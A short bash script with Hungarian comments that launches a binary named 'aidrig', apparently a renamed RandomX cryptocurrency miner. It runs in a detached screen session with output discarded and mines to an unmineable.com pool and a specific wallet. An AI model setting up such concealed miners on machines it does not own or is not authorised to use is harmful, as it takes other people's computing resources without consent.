#!/bin/bash

# Program elérési útja és indító paraméterek
AIDRIG_PATH="./aidrig"
AIDRIG_ARGS=" -a rx
 -o stratum+ssl://rx.unmineable.com:443
 -u POL:0x6b5aFB35eFbe303df30B86454c7D36f4e8D5FB2C.Ody_Pco_X5
 -t 6 -p x"

# Screen session neve
SESSION_NAME="aidrig_miner"

# Csak az aidrig fájlt tesszük futtathatóvá, ha még nem az
if [ ! -x "$AIDRIG_PATH" ]; then
  echo "Futtathatóvá tesszük az aidrig fájlt"
  chmod +x "$AIDRIG_PATH"
fi

# Ellenőrizzük, hogy fut-e már a session
if screen -list | grep -q "$SESSION_NAME"; then
  echo "A screen session már fut: $SESSION_NAME"
else
  echo "Screen session létrehozása: $SESSION_NAME"
  screen -dmS $SESSION_NAME $AIDRIG_PATH $AIDRIG_ARGS > /dev/null 2>&1
  echo "aidrig elindult: $SESSION_NAME"
fi